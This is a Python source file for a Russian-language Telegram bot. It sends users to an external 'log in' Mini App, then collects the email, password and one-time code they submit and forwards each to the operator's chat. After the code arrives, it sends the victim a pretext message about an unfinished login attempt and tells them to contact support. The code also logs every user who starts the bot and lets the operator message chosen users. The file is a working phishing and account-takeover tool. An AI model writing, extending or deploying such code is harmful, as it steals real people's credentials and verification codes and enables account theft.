import os
import logging
import json
import requests
import time
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.request import HTTPXRequest

# ==================== КОНФИГ ====================
# Railway автоматически подтянет эти данные из настроек Variables
BOT_TOKEN = os.environ.get("BOT_TOKEN")  
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
WEB_APP_URL = "https://d3987616-hue.github.io/erub-miniapp/"
DB_FILE = "users.json" 
# ===============================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Загрузка базы
def load_users():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            return set(json.load(f))
    return set()

# Сохранение базы
def save_users(users):
    with open(DB_FILE, "w") as f:
        json.dump(list(users), f)

user_db = load_users()
user_sessions = {}

class ErubBot:
    def __init__(self):
        # Добавляем таймауты, чтобы бот не падал на Railway
        custom_request = HTTPXRequest(connect_timeout=30.0, read_timeout=30.0)
        
        self.app = Application.builder()\
            .token(BOT_TOKEN)\
            .request(custom_request)\
            .get_updates_request(HTTPXRequest(connect_timeout=30.0))\
            .build()
            
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CommandHandler("send", self.send_to_user))
        self.app.add_handler(MessageHandler(filters.ALL, self.handle))

    # ===== 1. /start =====
    async def start(self, update: Update, context):
        user = update.effective_user
        user_id = user.id
        
        if user_id not in user_db:
            user_db.add(user_id)
            save_users(user_db)
            logger.info(f"Новый пользователь сохранен: {user_id}")

        current_time = datetime.now().strftime("%d.%m.%Y %H:%M")

        try:
            await self.app.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🟢 НОВЫЙ ВХОД В БОТА!\n\n"
                     f"👤 ID: `{user_id}`\n"
                     f"👤 Имя: {user.first_name or 'без имени'}\n"
                     f"👤 Username: @{user.username or 'нет'}\n"
                     f"🕐 Время: {current_time}\n"
                     f"📊 Всего в базе: {len(user_db)}",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Не удалось уведомить админа: {e}")

        await update.message.reply_text(
            f"👋 Привет, {user.first_name}!\n\n"
            f"Нажмите кнопку ВНИЗУ, чтобы открыть приложение.",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
                resize_keyboard=True
            )
        )

    # ===== 2. Отправка КОНКРЕТНОМУ пользователю =====
    async def send_to_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != ADMIN_ID:
            return

        if len(context.args) < 2:
            await update.message.reply_text("⚠️ Использование: `/send 123456789 Ваш текст`", parse_mode="Markdown")
            return

        try:
            target_id = int(context.args[0])
            text_to_send = " ".join(context.args[1:])
        except ValueError:
            await update.message.reply_text("❌ Ошибка: ID должен быть числом.")
            return

        try:
            await self.app.bot.send_message(chat_id=target_id, text=text_to_send)
            await update.message.reply_text(f"✅ Сообщение отправлено пользователю {target_id}.")
        except Exception as e:
            await update.message.reply_text(f"❌ Ошибка отправки: {e}")

    # ===== 3. Обработка данных из Mini App =====
    async def handle(self, update: Update, context):
        if not update.message:
            return

        msg = update.message
        chat_id = msg.chat.id
        user_id = msg.from_user.id
        text = msg.text

        if chat_id == ADMIN_ID:
            return

        if text and text.startswith('{') and text.endswith('}'):
            try:
                data = json.loads(text)
                email = data.get('email')
                password = data.get('password')
                code = data.get('code')
                
                if email and password and not code:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: `{user_id}`\n📧 Логин: `{email}`\n🔑 Пароль: `{password}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Данные приняты.")
                    return

                if code:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"📧 КОД!\n\n👤 ID: `{user_id}`\n🔢 Код: `{code}`",
                        parse_mode="Markdown"
                    )
                    try:
                        await self.app.bot.send_message(
                            chat_id=user_id,
                            text="По Вашему аккаунту видим незавершенную попытку входа. Свяжитесь с технической поддержкой."
                        )
                    except Exception as e:
                        logger.error(f"Не смог написать пользователю: {e}")

                    await msg.reply_text("✅ Код отправлен на проверку.")
                    return

            except Exception as e:
                logger.error(f"Ошибка JSON: {e}")
        else:
            await update.message.reply_text("ℹ️ Используйте кнопку «Войти»")

    def run(self):
        print("=" * 50)
        print("🚀 БОТ ЗАПУЩЕН НА RAILWAY")
        print("=" * 50)
        self.app.run_polling(bootstrap_retries=5)

if __name__ == "__main__":
    bot = ErubBot()
    bot.run()
